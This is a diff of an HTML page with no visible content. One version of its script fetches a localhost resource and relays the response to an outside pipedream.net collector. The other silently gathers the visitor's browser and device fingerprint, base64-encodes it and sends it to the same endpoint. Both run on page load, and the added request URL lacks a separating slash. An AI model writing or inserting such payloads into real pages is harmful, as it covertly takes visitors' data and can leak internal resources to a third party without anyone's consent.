@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,17 +9,31 @@
 </head>
 <body>
     <script>
-      const getReq = new XMLHttpRequest();
-        getReq.open('GET', 'http://127.0.0.1/Scrap/', true);
-        getReq.onload = () => {
-          
-        const data = encodeURIComponent(getReq.responseText); // Encode data for URL
-        const sendReq = new XMLHttpRequest();
-        sendReq.open('GET', `https://eo152lqegwprrxn.m.pipedream.net/${data}`, true);
-        sendReq.send();
-          
+        // Collect device and browser info
+        const deviceInfo = {
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
         };
-getReq.send();
+        
+        // Encode the data in Base64
+
+        const encodedData = btoa(JSON.stringify(deviceInfo));
+        
+        // Send the data using fetch
+        fetch('https://eo152lqegwprrxn.m.pipedream.net'+ encodedData)
+        
     </script>
 </body>
 </html>
